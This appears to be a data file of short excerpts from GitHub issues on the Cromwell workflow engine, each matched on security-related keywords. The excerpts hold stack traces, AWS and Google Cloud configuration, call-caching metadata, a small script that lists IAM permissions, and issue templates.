`giulio@broadinst",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:1569,Audit,AuditLog,1569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,2,"['Audit', 'authenticat']","['AuditLog', 'authenticationInfo']"
Security, scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendLifecycleActor$class.performActionThenRespond(BackendLifecycleActor.scala:44); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.performActionThenRespond(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:163); 	at akka.actor.Actor$class.aroundReceiv,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:2736,validat,validateRuntimeAttributes,2736,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['validat'],['validateRuntimeAttributes']
Security, strings should be of the format 'local-disk' or '/mount/point' but got: 'local-disk 100 HDD'; at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:935); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robu,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4274:1282,validat,validatedRuntimeAttributes,1282,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4274,1,['validat'],['validatedRuntimeAttributes']
Security, such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*R?.fq.gz': No such file or directory; ; 04:26:11; /bin/bash: line 44: /cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa': No such file or directory; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': Permission denied; ; 04:26:11; /bin/bash: line 52: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*.qcstats': No such file or directory; ; 04:26:11; /bin/bash: line 58: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': No such file or directory; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe': Permission denied; ; 04:26:11; /bin/bash: line 66: /cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/cwl.output.json': No such file or directory; ; 04:26:11; /bin/bash: line 72: /cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe': No such file or directory; ; 04:26:11; mv: cannot stat '/cromwell_root/bbmap-rc.txt.tmp': No such file or directory; ; 04:26:11; MIME-Version: 1.0; ; 04:26:11; Content-Type: multipart/alternative; boundary=278185423cec5467d351ab751807c36a; ; 04:26:11; --278185423cec5467d351ab751807c36a; ; 04:26:11; Content-Type: text/plain; ; 04:26:11; Content-Disposition: attachment; filename=rc.txt; ; 04:26:11; cat: /cromwell_root/bbmap-rc.txt: No such file or directory; ; 04:26:11; --278185423cec5467d351ab751807c36a; ; 04:26:11; Conte,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542:5954,access,access,5954,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542,2,['access'],['access']
Security," tests using the suggested edits to aws.conf. I then try to specify the output directories using the following `options.json` file. ```; {; ""final_workflow_outputs_dir"": ""s3://bucket/cromwell/outputs"",; ""final_call_logs_dir"": ""s3:/bucket/cromwell/call_logs"",; ""final_workflow_log_dir"": ""s3://bucket/cromwell/wf_logs""; }; ```. When running cromwell : `java -Dconfig.file=awsbatch/aws.conf -jar cromwell-36.jar run awsbatch/hello.wdl -i awsbatch/hello.inputs -o options.json`. it results with the error:. ```; [2019-01-12 00:31:03,94] [info] $a [866d19d0]: Copying workflow logs from /rcecloud/kmavrommatis/workspace/Workflows/cromwell/cromwell-workflow-logs/workflow.866d19d0-64da-45c3-9b69-830f0475ba12.log to s3://celgene-rnd-riku-researchanalytics/cromwell/wf_logs/workflow.866d19d0-64da-45c3-9b69-830f0475ba12.log; [2019-01-12 00:31:04,03] [error] Key cannot be empty; java.lang.IllegalArgumentException: Key cannot be empty; 	at software.amazon.awssdk.core.util.ValidationUtils.assertStringNotEmpty(ValidationUtils.java:111); 	at software.amazon.awssdk.core.runtime.transform.PathMarshallers$GreedyPathMarshaller.marshall(PathMarshallers.java:109); 	at software.amazon.awssdk.services.s3.transform.HeadObjectRequestMarshaller.marshall(HeadObjectRequestMarshaller.java:87); 	at software.amazon.awssdk.services.s3.transform.HeadObjectRequestMarshaller.marshall(HeadObjectRequestMarshaller.java:31); 	at software.amazon.awssdk.core.client.SyncClientHandlerImpl.execute(SyncClientHandlerImpl.java:88); 	at software.amazon.awssdk.core.client.SyncClientHandlerImpl.execute(SyncClientHandlerImpl.java:76); 	at software.amazon.awssdk.core.client.SdkClientHandler.execute(SdkClientHandler.java:45); 	at software.amazon.awssdk.services.s3.DefaultS3Client.headObject(DefaultS3Client.java:1628); 	at org.lerch.s3fs.util.S3Utils.getS3ObjectSummary(S3Utils.java:47); 	at org.lerch.s3fs.S3FileSystemProvider.exists(S3FileSystemProvider.java:624); 	at org.lerch.s3fs.S3FileSystemProvider.checkAccess(S3FileSystemP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4541:1074,Validat,ValidationUtils,1074,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4541,1,['Validat'],['ValidationUtils']
Security," to plug into Kubernetes,"" etc. The backends for HPC are going to; > be good to go with just a SLURM or SGE backend, and then commands to load; > and run/exec a Singularity container. When the time comes and Singularity; > supports services, then we can start to develop (I think) the singularity; > backend configuration for cromwell, with clean commands to get statuses,; > start and stop, and otherwise integrate into the software. You guys seem; > pretty busy, so likely your best bet would be to just wait, because the; > community is going in that direction anyway.; >; > The other representation is to rethink this. An approach that I like is to; > move away from micro managing the workflow / software, and to set; > requirements for the data. If you set standard formats (meaning everything; > from the organization of files down to the headers of a data file) on the; > data itself, then the software gets built around that. A researcher can; > have confidence that the data he is collecting will work with software; > because it's validated to the format. The developers can have confidence; > their tools will work with data because of that same format. A new graduate; > student knows how to develop a new tool because there are nicely defined; > rules. A good example is to look at the BIDS (brain imaging data structure); > that (has several file formats under it) but it revolutionizing how brain; > imaging analysis is done. (e.g, take a look at https://www.openneuro.org.; > Development of my Thinking; >; > Finally, I want to share how I came to the thinking above. Here are the; > steps that I've taken in the last few weeks, and resulting thoughts from; > them. I started with this issue board actually, and a general goal to ""Add; > Singularity to Cromwell."" Ok.; > Question 1: How do I develop Cromwell?; >; > It first was hard for me to know where to start to develop Cromwell,; > because the docs just went into how to compile it on a host. So it made; > sense to make it eas",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:9132,validat,validated,9132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['validat'],['validated']
Security," will be able to utilize results from all calls that are in that database.""_. Secondly, if this can. **Question 2.**. Can call caching be initiated if a scatter, wraps a workflow, which then wraps tools.; Or will the entire workflow need to be in one script? (I have attached an example as zip); And, the options file.; [DsTrim - Broken.zip](https://github.com/broadinstitute/cromwell/files/3842334/DsTrim.-.Broken.zip). **Question 3.**. What exactly triggers callcaching to change from ""CallCachingOff"" to on, in the following result?; `; ""callCaching"": {; ""effectiveCallCachingMode"": ""CallCachingOff"",; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss""; },`. **If the in-memory is the issue, then please close and we will set-up a UAT correctly.; If not any additional assistance or comments will be most apprecitated.** . ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5280:2894,PASSWORD,PASSWORDS,2894,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5280,1,['PASSWORD'],['PASSWORDS']
Security," xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]; permissions = [permission for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]. df = pd.DataFrame(dict(roles=roles, permissions=permissions)); df.to_csv(sys.stdout, sep = '\t', header = False, index = False); ```; When running this script, I get:; ```; $ ./roles.py | grep ""lifesciences.workflowsRunner\|iam.serviceAccountUser\|storage.objectAdmin\|storage.objectCreator\|storage.objectViewer"" | column -t; roles/iam.serviceAccountUser iam.serviceAccounts.actAs; roles/iam.serviceAccountUser iam.serviceAccounts.get; roles/iam.serviceAccountUser iam.serv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1683,access,access-token,1683,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['access'],['access-token']
Security, | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.getGenerators(SqlGeneratorFactory.java:123); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.createGeneratorChain(SqlGeneratorFactory.java:189); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.generateSql(SqlGeneratorFactory.java:221); 11:09:46 cromwell-test_1 | 	at liquibase.executor.AbstractExecutor.applyVisitors(AbstractExecutor.java:25); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.access$700(JdbcExecutor.java:36); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor$QueryStatementCallback.doInStatement(JdbcExecutor.java:338); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.query(JdbcExecutor.java:126); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.query(JdbcExecutor.java:134); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForObject(JdbcExecutor.java:142); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForObject(JdbcExecutor.java:157); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForInt(JdbcExecutor.java:178); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForInt(JdbcExecutor.java:173); 11:09:46 cromwell-test_1 | 	at liquibase.snapshot.SnapshotGeneratorFactory.has(SnapshotGeneratorFactory.java:98); 11:09:46 cromwell-test_1 |,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:5813,access,access,5813,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['access'],['access']
Security," |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:effectiveCallCachingMode|ReadAndWriteCache|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:effectiveCallCachingMode|ReadAndWriteCache|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:allowResultReuse|true|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:allowResultReuse|true|. <!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:8067,PASSWORD,PASSWORDS,8067,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['PASSWORD'],['PASSWORDS']
Security, |WORKFLOW_EXECUTION_UUID|METADATA_KEY|METADATA_VALUE|; |-----------------------|------------|--------------|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:result|Cache Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCachin,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:1640,hash,hashes,1640,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,5,['hash'],['hashes']
Security," },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads used for amber step\\n\"",\n \""id\"": \""#threads_amber\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads to run cobalt command\\n\"",\n \""id\"": \""#threads_cobalt\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads to use - set to 8 by default\"",\n \""id\"": \""#threads_gridss\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads\\n\"",\n \""id\"": \""#threads_purple\""\n },\n {\n \""type\"": \""File\"",\n \""doc\"": \""tumour BAM file\\n\"",\n \""secondaryFiles\"": [\n \"".bai\""\n ],\n \""id\"": \""#tumor_bam\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""sample name of tumor. Must match the somatic snvvcf sample name. (Default: \\\\${sample}_T)\\n\"",\n \""id\"": \""#tumor_sample\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""htsjdk SAM/BAM validation level (STRICT (default), LENIENT, or SILENT)\\n\"",\n \""default\"": \""STRICT\"",\n \""id\"": \""#validation_stringency\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""optional - list of known viral hosts - Refseq_id,Virus_name = viral_host_ref.csv\\n\"",\n \""id\"": \""#viral_hosts_file_linx\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Write output to for generation of Circos clustering and chaining plots\\n\"",\n \""id\"": \""#write_vis_data_linx\""\n }\n ],\n \""steps\"": [\n {\n \""in\"": [\n {\n \""source\"": \""#bafsnps_amber\"",\n \""id\"": \""#amber_step/loci\""\n },\n {\n \""source\"": \""#max_depth_percent_amber\"",\n \""id\"": \""#amber_step/max_depth_percent\""\n },\n {\n \""source\"": \""#max_het_af_percent_amber\"",\n \""id\"": \""#amber_step/max_het_af_percent\""\n },\n {\n \""source\"": \""#min_base_quality_amber\"",\n \""id\"": \""#amber_step/min_base_quality\""\n },\n {\n \""source\"": \""#min_depth_percent_amber\"",\n \""id\"": \""#amber_step/min_depth_percent\""\n },\n {\n \""source\"": \""#min_het_af_percent_amber\"",\n \""id\"": \""#amber",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:115146,validat,validation,115146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['validat'],['validation']
Security," }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; # Google project which will be billed for the requests; project = ""***-***"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }; }; }. default-runtime-attributes {; cpu: 2; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 SSD""; noAddress: false; preemptible: 0; zones: [""eu-west4-a"",""eu-west4-b"",""eu-west4-c""]; }. include ""papi_v2_reference_image_manifest.conf""; }; }; }; }; ```. Other info:; Debian GNU/Linux 10 (buster); openjdk version ""11.0.9.1-internal"" 2020-11-04 (through MiniConda, also tried with openjdk version ""11.0.12"" 2021-07-20, no difference to failure message). Permissions for service-account (quite liberal); ![image](https://user-images.githubusercontent.com/36060453/129350599-b68eee59-f08b-458f-b164-c48210b140de.png)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:15282,access,accessible,15282,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['access'],['accessible']
Security,"! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->; [2022-03-03 19:26:59,66] [info] WorkflowManagerActor: Workflow 496206d8-8854-48c1-abed-3717510ceb4e failed (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt: s3://s3.amazonaws.com/mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt; Caused by: java.io.IOException: Could not read from s3://mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt: s3://s3.amazonaws.com/mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->; ![image](https://user-images.githubusercontent.com/96741804/156643007-76a24c99-509c-4480-8484-df1c6f7b9c72.png). <!-- Which backend are you running? -->. AWS Batch. <!-- Paste/Attach your workflow if possible: -->. I have see this as an issue previously reported ; I am trying to set up a genomics work flow using AWS batch and Cromwell . How to solve this issue; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6695:2183,PASSWORD,PASSWORDS,2183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6695,1,['PASSWORD'],['PASSWORDS']
Security,![verbal reviewer](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ43keR0LMoYCkj3rvBJ-psREke9Dupmo0JiZjTZ0hBTZQlpW99JQ),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2511#issuecomment-320040669:27,encrypt,encrypted-,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2511#issuecomment-320040669,1,['encrypt'],['encrypted-']
Security,""" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File report = \""${report_filename}\""\n }\n}\n\nworkflow BamToUnmappedBams {\n File input_bam\n String dir_pattern = \""gs://.*/\""\n #String dir_pattern = \""/.*/\""\n Int revert_sam_disk_size = 400\n Int sort_sam_disk_size = 400\n Int validate_sam_file_disk_size = 200\n\n call RevertSam {\n input:\n input_bam = input_bam,\n revert_bam_name = sub(sub(input_bam, dir_pattern, \""\""), \"".bam$\"", \""\"") + \"".unmapped.bam\"",\n disk_size = revert_sam_disk_size\n }\n\n# call SortSam {\n# input:\n# input_bam = RevertSam.unmapped_bam,\n# sorted_bam_name = sub(sub(RevertSam.unmapped_bam, dir_pattern, \""\""), \"".bam$\"", \""\"") + \"".sorted.bam\"",\n# disk_size = sort_sam_disk_size\n# }\n\n call ValidateSamFile {\n input:\n input_bam = RevertSam.unmapped_bam,\n report_filename = sub(sub(RevertSam.unmapped_bam, dir_pattern, \""\""), \"".unmapped.bam$\"", \""\"") + \"".validation_report\"",\n disk_size = validate_sam_file_disk_size\n }\n\n output {\n RevertSam.*\n ValidateSamFile.*\n }\n}"",; ""options"": ""{\n \""default_runtime_attributes\"": {\n \""zones\"": \""us-central1-b us-central1-c us-central1-f\""\n },\n \""google_project\"": \""engle-macarthur-ccdd\"",\n \""auth_bucket\"": \""gs://cromwell-auth-engle-macarthur-ccdd\"",\n \""refresh_token\"": \""cleared\"",\n \""final_workflow_log_dir\"": \""gs://fc-4c1c7765-2de2-4214-ac41-dc10bbcbb55b/c7af7e06-a435-44ec-8466-124ad8e1bcaf/workflow.logs\"",\n \""account_name\"": \""kcibul@broadinstitute.org\"",\n \""jes_gcs_root\"": \""gs://fc-4c1c7765-2de2-4214-ac41-dc10bbcbb55b/c7af7e06-a435-44ec-8466-124ad8e1bcaf\""\n}""; },; ""calls"": {. },; ""outputs"": {. },; ""id"": ""a714b11b-0162-4585-afa5-abbd7433af51"",; ""inputs"": {; 